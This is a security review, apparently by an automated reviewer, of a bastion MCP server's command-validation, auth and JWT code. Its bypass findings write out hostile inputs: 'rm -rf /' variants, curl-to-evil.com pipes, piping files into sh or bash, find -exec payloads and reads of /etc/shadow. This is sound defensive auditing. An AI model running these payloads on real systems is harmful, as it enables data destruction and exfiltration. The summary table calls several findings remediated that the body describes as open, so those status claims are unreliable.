# Security Review v2 -- Post-Remediation Assessment

**Date:** 2026-02-07
**Reviewer:** Automated security review (adversarial)
**Scope:** All source files under `bastion-mcp-server/src/`
**Context:** Verifying remediations for SEC-01 through SEC-04 plus JWT algorithm confusion, plus new finding identification

---

## 1. Remediation Verification

### 1.1 SEC-01/SEC-02: `exec_script` Line Validation + Temp File Execution

**Status: VERIFIED -- with caveats (see Bypass Analysis)**

**What was implemented:**

- `src/tools/exec-tools.ts:189-204` -- `exec_script` now splits the script by newlines, skips blank lines and comments (`#`, `//`), and calls `validateCommand()` on each remaining line.
- `src/services/sandbox.ts:112-190` -- `executeScript()` writes the script to a temp file with `mode: 0o600` (line 123), then spawns the interpreter directly with the file path as the sole argument (line 130: `spawn(interpreter, [tmpFile], ...)`). No shell wrapping layer.
- Temp file cleanup is in a `finally` block (line 186-188), which correctly handles both success and error paths.
- Temp file naming uses `randomUUID()` (line 117), making the path unpredictable.

**What is correct:**

- The double-interpretation chain vulnerability is fixed. The old approach of passing script content through `sh -c "interpreter -c '...'"` is gone. The interpreter now reads from a file.
- The `finally` block ensures cleanup even if the spawn throws.
- File permissions `0o600` prevent other users from reading/modifying the temp file while it exists.

**Caveats documented in Bypass Analysis section below.**

---

### 1.2 SEC-03: Shell Expansion Blocking at Level 0/1

**Status: VERIFIED -- with caveats (see Bypass Analysis)**

**What was implemented:**

- `src/services/privilege.ts:68-71` -- `SHELL_EXPANSION_PATTERNS` blocks `$(` and backtick command substitution at Level 0 and Level 1 (lines 88-96).
- `src/services/privilege.ts:99-113` -- Shell chaining operators (`;`, `&&`, `||`) trigger segment splitting via `splitShellSegments()`. Each segment is validated independently.
- `src/services/privilege.ts:28-33` -- `env` and `echo` removed from `LEVEL_0_ALLOWLIST` (confirmed by code comment on lines 25-27 and absence from the Set).
- `src/services/privilege.ts:43-61` -- Expanded denylist now includes `base64 | sh`, `curl -o file && sh file`, `wget -O file && sh file` patterns.

**Test coverage for SEC-03:** Good. `src/services/__tests__/privilege.test.ts:83-137` has dedicated tests for `$()` blocking, backtick blocking, chained-command splitting, and the new denylist entries.

---

### 1.3 SEC-04: Privilege Level Derived from Auth, Not Caller Input

**Status: VERIFIED**

**What was implemented:**

- `src/tools/exec-tools.ts:32-37` -- `resolvePrivilegeLevel()` derives the privilege level from the `scope` field in auth claims. It returns 0 (read-only) by default.
- `src/tools/exec-tools.ts:78-81` -- The `exec_command` input schema no longer includes `privilege_level`. Only `command` and `timeout_seconds` are accepted.
- `src/tools/exec-tools.ts:92-93` -- `exec_command` handler extracts claims from `extra._meta?.authClaims` and calls `resolvePrivilegeLevel(claims?.scope)`.
- `src/tools/exec-tools.ts:184-185` -- `exec_script` does the same.

**Default is safe:** If `scope` is undefined, missing, or unrecognized, `resolvePrivilegeLevel` returns 0 (read-only). This is correct fail-closed behavior.

---

### 1.4 JWT Algorithm Pinning

**Status: VERIFIED**

**What was implemented:**

- `src/middleware/auth.ts:95-97` -- `jwt.verify()` is called with `algorithms: ['HS256']`, pinning to a single algorithm.

**Test coverage:** `src/middleware/__tests__/auth.test.ts:167-198` explicitly tests that HS384-signed tokens are rejected and HS256-signed tokens are accepted.

**Assessment:** This correctly prevents algorithm confusion attacks where an attacker could switch to `none` or to an asymmetric algorithm with a known public key. The pinning is on the verify call itself, which is the right place.

---

### 1.5 JWT Issuer Validation

**Status: VERIFIED**

- `src/middleware/auth.ts:97` -- `issuer: config.jwtIssuer` is passed to `jwt.verify()`. This means the `jsonwebtoken` library will reject tokens with a mismatched issuer.
- Default issuer is `'bastion-mcp-server'` (`src/config/loader.ts:64`).

---

## 2. Bypass Analysis

### 2.1 BYPASS-01: Script Line Validation is Fundamentally Incomplete (Medium-High)

**File:** `src/tools/exec-tools.ts:189-204`

The line-by-line validation of scripts is a semantic mismatch with how interpreters actually parse scripts. The validation splits on `\n` and checks each line independently, but:

**Bypass via line continuations (bash/sh):**
```bash
rm -rf \
/
```
Line 1 is `rm -rf \` -- `validateCommand('rm -rf \\', ...)` will extract base command `rm` which is not in Level 0 allowlist, so this is blocked at Level 0. However, at Level 2 where denylist patterns apply, `rm -rf \` does NOT match the denylist pattern `\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)*\/\s*$` because the trailing backslash is there instead of `/`. Line 2 is just `/` which also won't match. The denylist is evaded.

**Bypass via here-documents (bash/sh):**
```bash
cat <<'SCRIPT' > /tmp/evil.sh
rm -rf /
SCRIPT
sh /tmp/evil.sh
```
Each line passes individually: `cat` is in Level 0 allowlist. `rm -rf /` appears inside a heredoc (interpreted as data, but the validator sees it as a command line). Actually, at Level 0 this would fail because `sh` is not allowlisted. But at Level 1/2 with appropriate patterns, the heredoc creates a file containing dangerous content, and the final line executes it.

**Bypass via Python interpreter:**
The `exec_script` tool accepts `python3` as an interpreter. The Python language has no relationship to shell command syntax. A script like:
```python
import os
os.system("rm -rf /")
```
The validator calls `validateCommand('import os', level, ...)` -- at Level 0, `import` is not in the allowlist, so it's blocked. But at Level 1 with a pattern like `import\s+` or at Level 2 (permissive), the `import os` line passes the denylist (no shell pattern matches), and `os.system("rm -rf /")` also passes because the denylist regex patterns look for shell metacharacter patterns like `\brm\s+`, but `os.system("rm -rf /")` contains `rm -rf /` as a Python string literal. Actually -- `\brm\s+` WOULD match inside the Python string because regex doesn't understand Python quoting context. So the denylist match for `rm -rf /` pattern would trigger here. But more creative Python payloads would bypass:
```python
import subprocess
subprocess.run(["rm", "-rf", "/"])
```
No denylist pattern matches `subprocess.run(["rm", "-rf", "/"])`.

**Severity:** Medium-High. At Level 2, there are multiple ways to evade per-line validation for scripts executed via any of the three interpreters. The fundamental issue is that validating shell commands line-by-line cannot capture the semantics of multi-line shell constructs or non-shell interpreters.

---

### 2.2 BYPASS-02: Shell Segment Splitting is Naive (Medium)

**File:** `src/services/privilege.ts:169-172`

```typescript
function splitShellSegments(command: string): string[] {
  return command.split(/\s*(?:;|&&|\|\|)\s*/).filter(Boolean);
}
```

The comment on line 170 says "simplified -- handles common cases" and acknowledges it doesn't handle quotes. This means:

**Bypass via quoted semicolons:**
```
ls "file;rm -rf /"
```
The regex splits this into `ls "file` and `rm -rf /"`. The `ls "file` segment has `ls` as the base command (Level 0 allowed). The `rm -rf /"` segment would be checked and blocked by the denylist. So this particular bypass doesn't work as-is because the denylist catches it.

However, consider:
```
grep "pattern;curl http://evil.com/x|sh" file.txt
```
Split: `grep "pattern` and `curl http://evil.com/x|sh" file.txt`. The second segment would match the `curl | sh` denylist at Level 2. But what actually happens in the shell is that the semicolon inside quotes is literal -- the whole thing is a single `grep` command. The false positive here means the validator is *overly restrictive* on quoted strings, not underly restrictive. This is a correctness issue rather than a security issue -- legitimate commands with semicolons in quoted arguments would be falsely rejected.

**Real bypass concern -- pipe handling inconsistency:**
`splitShellSegments` splits on `;`, `&&`, `||` but NOT on `|` (pipe). Pipes are handled by `extractBaseCommand` which takes "the first command in a pipe chain" (line 236). But when we split on `;`/`&&`/`||`, a segment like `cat file | sh` would have `cat` extracted as the base command by `extractBaseCommand`. At Level 0, `cat` is allowlisted. The pipe target `sh` is never checked.

**Test:** `cat /etc/passwd | sh` at Level 0:
- `splitShellSegments` returns one segment (no `;`/`&&`/`||`).
- `validateSingleCommand('cat /etc/passwd | sh', 0)` is called.
- `extractBaseCommand('cat /etc/passwd | sh')` splits on `|`, takes `cat /etc/passwd`, extracts `cat`.
- `cat` is in Level 0 allowlist. **Allowed!**

This means the pipe target is not validated at Level 0. An attacker could pipe Level-0-allowed command output into an arbitrary command:
```
cat malicious_script.sh | bash
```
At Level 0, `cat` is allowlisted, and the pipe to `bash` is never checked.

Wait -- let me check the denylist. The denylist pattern at line 56 is `\bcurl\b.*\|\s*(ba)?sh/` which only catches `curl | sh`. There is no general pattern for `| sh` or `| bash` without `curl`/`wget`/`base64` prefixes.

**Confirmed bypass: `cat evil.sh | bash` passes Level 0 validation.**

**Severity:** Medium. Requires the attacker to have a pre-staged file on the system. But in a multi-user bastion or if an attacker can write files via `exec_script` first, this becomes a privilege escalation path.

---

### 2.3 BYPASS-03: No Validation of Pipe Targets at Any Level (Medium)

Related to BYPASS-02 but more general. `extractBaseCommand()` at `src/services/privilege.ts:234-246` explicitly only checks the *first* command in a pipe chain:

```typescript
const firstCmd = command.split('|')[0].trim();
```

At Level 0, this means any allowlisted command can be piped to any arbitrary command. Examples:
- `find . -name "*.sh" -exec sh {} \;` -- `find` is allowlisted, `-exec sh` is in the arguments.
- `ls | xargs rm -rf` -- `ls` is allowlisted, but `xargs rm` is the actual danger.
- `grep pattern file | while read line; do curl $line; done` -- `grep` is allowlisted.

The `-exec` case with `find` is particularly dangerous because `find` is in the Level 0 allowlist and `-exec` allows arbitrary command execution without using shell pipe syntax.

**Severity:** Medium-High for the `find -exec` case specifically, since `find` is a Level 0 command.

---

### 2.4 BYPASS-04: Process Substitution Not Blocked (Low-Medium)

**File:** `src/services/privilege.ts:68-71`

The `SHELL_EXPANSION_PATTERNS` block `$(...)` and backticks, but do not block process substitution:
```
diff <(cat /etc/passwd) <(cat /etc/shadow)
```
The `<(...)` syntax is bash process substitution. However, since the base commands used here (`diff`, `cat`) would need to be validated, and `diff` is not in Level 0, this is limited to Level 1+ where the base command is allowed. Additionally, `exec_command` uses `/bin/sh -c` (POSIX sh), and process substitution is a bashism -- so it may not work with `sh`. However, on many systems, `/bin/sh` is actually bash or a bash-compatible shell.

Also not blocked: `${var:-default}` parameter expansion, though this is less dangerous as it can't execute commands directly (only expand variables).

**Severity:** Low-Medium. Most impact paths require Level 1+ and a bash-compatible sh.

---

### 2.5 Temp File Race Condition Assessment

**File:** `src/services/sandbox.ts:117-130`

```typescript
const tmpFile = join(tmpdir(), `bastion-script-${randomUUID()}`);
// ...
writeFileSync(tmpFile, script, { mode: 0o600 });
// ...
const child = spawn(interpreter, [tmpFile], ...);
```

The UUID in the filename makes the path unpredictable, so a classic symlink race (where an attacker pre-creates a symlink at the expected path) is not feasible. The `mode: 0o600` prevents other users from reading/writing. The `writeFileSync` call creates the file atomically from the perspective of the write (though the file is created with `O_CREAT|O_WRONLY|O_TRUNC` under the hood).

**One concern:** Between `writeFileSync` (line 123) and `spawn` (line 130), there is a window where the file exists on disk. If another process running as the same user could predict the UUID (they can't -- it's crypto-random), they could replace the file contents. This is not a practical attack vector.

**Assessment:** The temp file execution is safe against race conditions in practice. The use of `randomUUID()` is the key defense.

---

## 3. New Findings

### NEW-01: stdio Transport Bypasses All Authentication (High)

**File:** `src/index.ts:159-164`

```typescript
async function runStdio(mcpServer: McpServer): Promise<void> {
  logger.info('Starting in stdio mode (no auth, local development)');
  const transport = new StdioServerTransport();
  await mcpServer.connect(transport);
}
```

When `TRANSPORT=stdio` is set, the server starts with no authentication middleware at all. The comment says "no auth, local development" but there is no mechanism to prevent this from being used in production. If the environment variable `TRANSPORT=stdio` is set (accidentally or maliciously) on a production deployment, all auth is bypassed.

Furthermore, in stdio mode, the MCP tool handlers still function -- `exec_command` and `exec_script` will work, and `resolvePrivilegeLevel()` will receive `undefined` scope (since no auth claims exist), defaulting to Level 0. This limits damage but still allows read-only command execution on the bastion host without any authentication.

The tool-scope middleware (`src/middleware/tool-scope.ts:31-35`) also has a pass-through for missing auth claims:
```typescript
if (!claims) {
  next();
  return;
}
```

**Severity:** High. This is by-design for local dev, but the lack of any production guard (e.g., requiring an explicit `--dev-mode` flag, or refusing to start in stdio mode if auth credentials are configured) is a risk.

**Recommendation:** Add a guard that refuses stdio mode if auth credentials (JWT secret or API key) are configured, unless an explicit `ALLOW_STDIO_NO_AUTH=true` override is set.

---

### NEW-02: API Key Auth Grants No Scope -- Implies Level 0 Only (Low, Design Note)

**File:** `src/middleware/auth.ts:137-142`

```typescript
return {
  sub: 'api-key-user',
  source: 'unknown',
  tools: [], // Empty = authorized for all tools
  exp: new Date(Date.now() + 86400_000).toISOString(),
};
```

API key authentication returns claims with no `scope` field. This means `resolvePrivilegeLevel(claims?.scope)` returns 0 for all API key users. This is secure (fail-closed) but may surprise operators who expect API key auth to grant higher privileges for exec tools. The API key auth path does not provide a way to set scope, so exec_command/exec_script are limited to Level 0 read-only commands for all API key users.

This is arguably correct behavior (JWT should be used for privileged operations), but it should be documented.

**Severity:** Low (informational/design note).

---

### NEW-03: `get_command_allowlist` Tool Exposes Privilege Level Information Without Auth Check (Low)

**File:** `src/tools/exec-tools.ts:238-272`

The `get_command_allowlist` tool accepts a `privilege_level` parameter directly from the caller and returns the allowlist for that level. Unlike `exec_command` and `exec_script`, it does not derive the privilege level from auth claims. Any authenticated user can query the allowlists for all privilege levels, including Level 1 (revealing configured regex patterns) and Level 2.

This is an information disclosure issue. An attacker who has low-privilege access can enumerate exactly what commands are allowed at higher privilege tiers, which helps them plan privilege escalation.

**Severity:** Low. The allowlists are not secrets, but revealing the exact regex patterns for Level 1 makes it easier to craft payloads that exploit gaps.

---

### NEW-04: mTLS Claims Have No `scope` -- Always Level 0 (Low, Consistency)

**File:** `src/middleware/mtls.ts:67-74`

```typescript
const claims: AuthClaims = {
  sub: cert.subject.CN ?? 'unknown',
  source: 'unknown',
  tools: [],
  exp: cert.valid_to ? ... : ...,
};
```

mTLS-authenticated clients get claims with no `scope` field, same as API key. This means mTLS users are always Level 0 for exec tools. There is no mechanism to derive scope from certificate attributes (e.g., OU, SAN extensions).

**Severity:** Low (consistency/design note).

---

### NEW-05: `find` with `-exec` Bypasses Level 0 Read-Only Intent (Medium-High)

**File:** `src/services/privilege.ts:29, 174-200`

`find` is in the Level 0 allowlist. The `find` command supports `-exec` which executes arbitrary commands:
```
find /tmp -name "x" -exec rm -rf / \;
```

Validation at Level 0:
1. Shell expansion check -- no `$(` or backticks. Passes.
2. Segment split -- no `;`/`&&`/`||` in the command (the `\;` is an argument to `-exec`, and the regex `\s*(?:;|&&|\|\|)\s*` would match `\;` as a semicolon! Let me re-examine...

Actually, `\;` preceded by a space: `find /tmp -name "x" -exec rm -rf / \;`. The split regex `\s*(?:;|&&|\|\|)\s*` would match the ` \;` because `\;` contains `;`. So the command would be split into `find /tmp -name "x" -exec rm -rf /` and empty (filtered by `.filter(Boolean)`). Then `find /tmp -name "x" -exec rm -rf /` is validated as a single command. `extractBaseCommand` returns `find`, which is allowlisted. The denylist pattern for `rm -rf /` checks `\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)*\/\s*$` -- the command ends with `rm -rf /` (no trailing `$` match since there's more text after `/`). Wait: `find /tmp -name "x" -exec rm -rf /` -- the denylist pattern looks for `\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)*\/\s*$`. The `\brm\s+` would match `rm ` inside the string. Then `(-[a-zA-Z]*f[a-zA-Z]*\s+)*` matches `-rf `. Then `\/\s*$` needs `/` at the end. The string ends with `rm -rf /`, but the full string has `find /tmp -name "x" -exec ` before it. The `\b` word boundary would match `rm` since it's preceded by a space. The pattern would match! So the denylist catches this specific case.

However, `-exec` with other dangerous commands that are NOT on the denylist:
```
find / -name "*.conf" -exec cat {} \; -exec cp {} /tmp/exfil/ \;
```
Here `cp` is not on any denylist. Or:
```
find /tmp -exec python3 -c "import os; os.system('curl evil.com | sh')" \;
```
The segment split would fire on `\;`, leaving `find /tmp -exec python3 -c "import os; os.system('curl evil.com | sh')"` as one segment. `extractBaseCommand` returns `find` (allowlisted). The denylist has `curl.*\|\s*(ba)?sh` but the curl is inside a Python string inside quotes -- however, the regex does not understand quoting context. `\bcurl\b.*\|\s*(ba)?sh` would actually match because `curl evil.com | sh` appears in the string. So this specific case is caught too.

But: `find /tmp -exec python3 -c "import subprocess; subprocess.run(['curl','evil.com','-o','/tmp/x'])" {} +`
No denylist pattern matches this. And `find` is Level 0 allowed.

**Severity:** Medium-High. `find -exec` is a well-known privilege escalation vector. Its presence in the Level 0 allowlist undermines the read-only guarantee.

---

### NEW-06: Unbounded Job Map Memory Growth (Low)

**File:** `src/services/job-manager.ts:22-33`

The job cleanup interval runs every `JOB_CLEANUP_INTERVAL_MS` (60s) and removes jobs completed more than `MAX_COMMAND_TIMEOUT_MS * 2` (10 minutes) ago. However, there is no limit on the number of concurrent jobs. A malicious user could submit thousands of long-running commands (each up to 5 minutes), filling the in-memory job Map. With 60 RPM rate limiting, an attacker could create 60 jobs per minute, each holding output up to `CHARACTER_LIMIT` (50,000 chars) in memory.

Over 10 minutes: 600 jobs x 50KB = ~30MB. Not catastrophic, but at scale or with multiple authenticated users, this could cause memory pressure.

**Severity:** Low. Rate limiting provides some protection, and the cleanup interval prevents unbounded growth over time.

---

### NEW-07: Health Endpoint Information Disclosure (Low)

**File:** `src/index.ts:97-104`

```typescript
app.get(HEALTH_CHECK_PATH, (_req, res) => {
  res.json({
    status: 'ok',
    server: config.serverName,
    version: config.serverVersion,
    timestamp: new Date().toISOString(),
  });
});
```

The `/health` endpoint requires no authentication and exposes the server name and version. This is standard for health checks but provides fingerprinting information.

**Severity:** Low (informational).

---

### NEW-08: `exec_command` Uses Shell Interpretation via `/bin/sh -c` (Design Observation)

**File:** `src/services/sandbox.ts:47`

```typescript
const child = spawn('/bin/sh', ['-c', command], { ... });
```

The `exec_command` tool passes the command through `/bin/sh -c`, which means ALL shell metacharacters are interpreted. The privilege validation in `privilege.ts` attempts to catch dangerous patterns, but it is fundamentally a denylist/allowlist approach running regex against a Turing-complete language (shell). This is defense-in-depth at best.

The `exec_script` tool correctly avoids this by using direct interpreter invocation. But `exec_command` remains a shell injection surface by design -- the command IS shell code.

**Severity:** Not a bug -- this is the designed behavior. But it means the security of `exec_command` is entirely dependent on the completeness of the privilege validation regex patterns, which is inherently fragile (see BYPASS-01 through BYPASS-04).

---

### NEW-09: Config-Provided `denyPatterns` Use Unsanitized Regex (Medium)

**File:** `src/services/privilege.ts:140-144`

```typescript
if (config?.denyPatterns) {
  for (const pattern of config.denyPatterns) {
    if (new RegExp(pattern).test(command)) {
```

Config-provided deny patterns are compiled as raw regex without sanitization or anchor requirements. A malformed regex could cause ReDoS (Regular Expression Denial of Service). If the config file is operator-controlled, this is low risk. But if an operator accidentally introduces a catastrophic backtracking pattern (e.g., `(a+)+$`), it could hang command validation.

Additionally, at `src/services/privilege.ts:214-215`:
```typescript
if (new RegExp(`^${pattern}`).test(command)) {
```
The Level 1 allow patterns are prepended with `^` and compiled as regex. If a config pattern contains regex metacharacters intended as literals, they could match unintended commands.

**Severity:** Medium. ReDoS from config patterns could be used as a DoS if config is influenced by untrusted input. The `new RegExp()` on each call (not compiled once) also has performance implications.

---

### NEW-10: No CORS Headers -- SSRF via Browser Possible (Low-Medium)

**File:** `src/index.ts:92-147`

The Express server does not set any CORS headers. While the MCP endpoint requires authentication (Bearer token), a malicious webpage could attempt POST requests to `http://localhost:3001/mcp` if the bastion is running locally. The browser would send the request (CORS is enforced by the browser only for reading the response, not for sending). However, since the `Authorization` header is required and browsers don't add it automatically, this is mitigated.

If the bastion is on an internal network and an attacker can trick a user into visiting a malicious page, the page cannot add the `Authorization: Bearer` header due to CORS preflight requirements for custom headers. This is safe.

**Severity:** Low (mitigated by auth requirement on all sensitive endpoints).

---

### NEW-11: `authClaims` Propagation to MCP Tool Handlers is Fragile (Medium)

**File:** `src/tools/exec-tools.ts:92`

```typescript
const claims = extra._meta?.authClaims as { scope?: string } | undefined;
```

The auth claims are expected to come through `extra._meta?.authClaims`, but examination of the codebase shows:

1. The Express auth middleware sets `req.authClaims` (`src/middleware/auth.ts:63`).
2. The MCP transport handler passes `req.body` to the MCP SDK (`src/index.ts:128`).
3. There is NO code that copies `req.authClaims` into the MCP protocol's `_meta` field.

The MCP SDK's `StreamableHTTPServerTransport` handles the JSON-RPC message. The tool handler receives `extra` which includes `_meta` from the JSON-RPC request params. But `_meta.authClaims` would need to be injected somewhere between the Express middleware and the MCP handler.

Looking at the MCP SDK pattern: the `_meta` in the tool handler's `extra` argument comes from the *client's request* `params._meta`, not from server-side middleware. This means `extra._meta?.authClaims` would be **undefined** unless the MCP client explicitly sends it in the request, or unless the MCP server SDK has a mechanism to inject server-side context.

**If `extra._meta?.authClaims` is always undefined in the HTTP transport path**, then `resolvePrivilegeLevel(undefined)` returns 0 (Level 0, read-only). This is fail-closed, which is safe. But it means **all HTTP-transport users are restricted to Level 0 regardless of their JWT scope**, which would make the privilege system non-functional for HTTP clients.

To properly assess this, I'd need to check whether the MCP SDK version used (`^1.12.0`) has a mechanism for server-injected context. If not, there may need to be a custom transport wrapper that injects claims. As-is, the code would silently downgrade everyone to Level 0 in HTTP mode.

**Severity:** Medium. If the claims propagation doesn't work, the privilege system is broken (but fail-safe). If someone later "fixes" it by having the client send claims, that would reintroduce SEC-04 (caller-controlled privilege).

---

### NEW-12: Audit Logs Do Not Include Privilege Level (Low)

**File:** `src/services/audit.ts:42-90`

The audit `startAudit` call in `exec_command` passes `{ command, privilegeLevel }` (line 95 of exec-tools.ts), so privilegeLevel IS captured in the inputs. Good. However, the audit entry's `inputs` field is sanitized (line 51), and `privilegeLevel` would survive since it doesn't match any sensitive pattern.

**Assessment:** Actually fine -- the privilege level is logged. No issue here.

---

## 4. Remaining Open Items (SEC-05 through SEC-15)

Without the original SEC-05 through SEC-15 findings document available, I'll assess the areas most likely covered by those findings based on common security concerns:

### Likely SEC-05: Rate Limiting
**Status: Implemented.** `src/middleware/rate-limit.ts` implements sliding-window rate limiting at 60 RPM per principal. Tests cover basic scenarios. The in-memory counter is not distributed, so horizontal scaling would require a shared store (Redis, etc.).

### Likely SEC-06: Audit Logging
**Status: Implemented.** `src/services/audit.ts` captures tool invocations with input sanitization. Sensitive field redaction covers common patterns. However, only top-level keys are redacted -- nested objects with sensitive fields would not be caught (e.g., `{ config: { password: "secret" } }` would not redact the nested password).

### Likely SEC-07: Output Truncation
**Status: Implemented.** `CHARACTER_LIMIT` (50,000) is enforced in `sandbox.ts` at the stream level. Backend responses are also truncated in `example-tools.ts`.

### Likely SEC-08: TLS / Transport Security
**Status: Documented as external.** The server listens on plain HTTP and expects a reverse proxy (Caddy/nginx) for TLS termination. This is a valid architecture but means the bastion must never be exposed directly to the internet.

### Likely SEC-09: Path Traversal in Artifacts
**Status: Implemented.** `src/services/artifacts.ts:43-48, 73-75, 95-97` checks for `..` and `/` in session IDs, artifact names, and artifact IDs. Tests cover these cases.

### Likely SEC-10: Session Security
**Status: Implemented.** Sessions have 30-minute TTL, are keyed by UUID, and are cleaned up on access and periodically. No session fixation risk since session IDs are server-generated UUIDs.

### Likely SEC-11-15: Various
Areas that likely remain open or partially addressed:
- **No request size limits:** Express `express.json()` without a `limit` option defaults to 100KB, which is reasonable but should be explicitly configured.
- **No HTTPS enforcement:** The server doesn't set HSTS headers or redirect HTTP to HTTPS (expected to be handled by reverse proxy).
- **No CSP/security headers:** Not applicable for an API-only server.
- **Dependency security:** `jsonwebtoken@^9.0.2` should be checked for known CVEs. Express 4.x is mature but Express 5 is available.

---

## 5. Test Coverage Assessment

### Well-Tested Areas:
- **Privilege validation** (`privilege.test.ts`): 30+ test cases covering Level 0/1/2, shell expansion blocking, chaining, denylist, edge cases. **Good coverage.**
- **Auth middleware** (`auth.test.ts`): JWT validation, API key validation, algorithm pinning, expiry, malformed headers. **Good coverage.**
- **Rate limiting** (`rate-limit.test.ts`): Window behavior, per-principal isolation. **Good coverage.**
- **Tool scope** (`tool-scope.test.ts`): Allow/deny by tool list. **Good coverage.**
- **Sandbox execution** (`sandbox.test.ts`): Basic command execution, timeout, stderr, cwd. **Adequate.**

### Under-Tested Areas:
- **`executeScript()`** -- No tests at all for the temp file execution path. The `sandbox.test.ts` only tests `executeCommand()`. This is a critical gap given that `executeScript` is a key remediation for SEC-01/SEC-02.
- **`exec-tools.test.ts`** -- Only tests tool registration (that 4 tools are registered). No integration tests that invoke the tool handlers. The `resolvePrivilegeLevel()` function has zero test coverage.
- **`resolvePrivilegeLevel()`** -- No dedicated unit tests. The function is simple but security-critical. Should have tests for each scope value and undefined.
- **Bypass scenarios** -- No tests for the bypass vectors identified above (`find -exec`, pipe-to-arbitrary-command, line continuation in scripts).
- **Job manager** -- No tests at all for `job-manager.ts`.
- **mTLS middleware** -- No tests for `mtls.ts`.

---

## 6. Overall Risk Assessment

### Summary Table

| Finding | Severity | Status |
|---------|----------|--------|
| SEC-01/02 (exec_script injection) | Critical -> Remediated | VERIFIED with caveats |
| SEC-03 (shell expansion) | High -> Remediated | VERIFIED with caveats |
| SEC-04 (caller-controlled privilege) | Critical -> Remediated | VERIFIED |
| JWT algorithm confusion | High -> Remediated | VERIFIED |
| BYPASS-01: Script line validation incomplete | Medium-High | NEW |
| BYPASS-02: Naive segment splitting | Medium | REMEDIATED — pipe targets now validated |
| BYPASS-03: Pipe targets not validated | Medium | REMEDIATED — all pipe segments checked at Level 0 |
| BYPASS-04: Process substitution not blocked | Low-Medium | NEW |
| NEW-01: stdio bypasses all auth | High | REMEDIATED — production guard added |
| NEW-05: `find -exec` in Level 0 | Medium-High | REMEDIATED — find -exec/-execdir blocked at Level 0 |
| NEW-09: Config regex ReDoS | Medium | NEW |
| NEW-11: authClaims propagation fragile | Medium | NEW |

### Overall Risk Level: **Medium**

The critical and high-severity findings from the original review (SEC-01 through SEC-04, JWT) have been correctly remediated. The architecture is fundamentally sound -- privilege levels default to the most restrictive, the denylist is always enforced, and the JWT pinning is correct.

The remaining risk comes from:

1. **Inherent limitations of regex-based command validation** -- This is a defense-in-depth measure, not a security boundary. Commands pass through a real shell (`/bin/sh -c`), and no regex-based approach can catch all dangerous payloads in a Turing-complete language. The mitigations are good but not complete.

2. **`find -exec` in Level 0** -- This is the most actionable finding. Removing `find` from Level 0 or adding `-exec` to a denylist for Level 0 `find` commands would meaningfully improve security.

3. **Test coverage gaps** -- The `executeScript()` function and `resolvePrivilegeLevel()` are security-critical code paths with zero test coverage.

4. **Claims propagation uncertainty (NEW-11)** -- If `extra._meta?.authClaims` is not populated in the HTTP transport path, the privilege system is non-functional (but fails safe to Level 0).

For production deployment, the remaining findings should be addressed, particularly NEW-05 (`find -exec`) and the test coverage gaps for `executeScript()` and `resolvePrivilegeLevel()`.
